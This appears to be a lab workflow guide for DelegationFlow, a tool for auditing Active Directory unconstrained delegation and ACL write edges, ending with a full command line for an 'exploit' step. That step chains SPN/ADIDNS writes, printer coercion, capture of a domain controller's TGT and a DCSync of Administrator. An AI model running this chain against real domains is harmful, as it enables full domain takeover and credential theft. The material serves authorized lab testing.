# Delegation Lab Workflow

This workflow uses DelegationFlow for reconnaissance and evidence collection, plus an optional explicit exploitation command for the authorized lab.

1. Run `delegationflow check` to validate LDAP connectivity and the supplied bind identity.
2. Run `delegationflow full-audit` to inventory delegation modes, domain controllers, and Protected Users context.
3. If an extracted BloodHound JSON export is available, run `delegationflow bloodhound --directory <export-dir>` and review write-capable ACL edges.
4. Correlate the reported principal and target DNs/SIDs with the lab's stated permissions. A write edge (GenericWrite, GenericAll, etc.) and a delegation flag are separate observations; verify that the edge applies to the exact object and is effective.
5. Save JSON and HTML reports as evidence. The read-only commands stop at evidence collection; the separate `exploit` command performs the hands-on validation step.

For the unconstrained-delegation exercise, the key assessment questions are:

- Which account has the unconstrained delegation flag?
- Which principal has a write-capable relationship to that exact account?
- Is the principal-to-target relationship present in the supplied ACL evidence?
- Which domain controller is in scope, and what protective account context is visible?

The read-only commands intentionally stop at evidence collection. To validate the
full chain against a lab domain, the separate `exploit` command automates the same steps:

```bash
export DELEGATIONFLOW_PASSWORD='<account password>'
delegationflow exploit \
  --server dc01.lab.local \
  --base-dn 'DC=lab,DC=local' \
  --username 'LAB\analyst' \
  --target-account someuser \
  --target-password 'someuser-password' \
  --attacker-host roguecomputer \
  --loot-dir ./loot \
  --flag-path 'C:\flags\target-flag.txt' \
  --cleanup
unset DELEGATIONFLOW_PASSWORD
```

The command performs the ADIDNS/SPN writes, starts the SMB listener, triggers the
printer coercion, captures the delegated DC machine TGT, DCSyncs `Administrator`,
and reads the requested file. Use it only on the authorized lab target, and use
`--cleanup` to restore the directory changes it made.
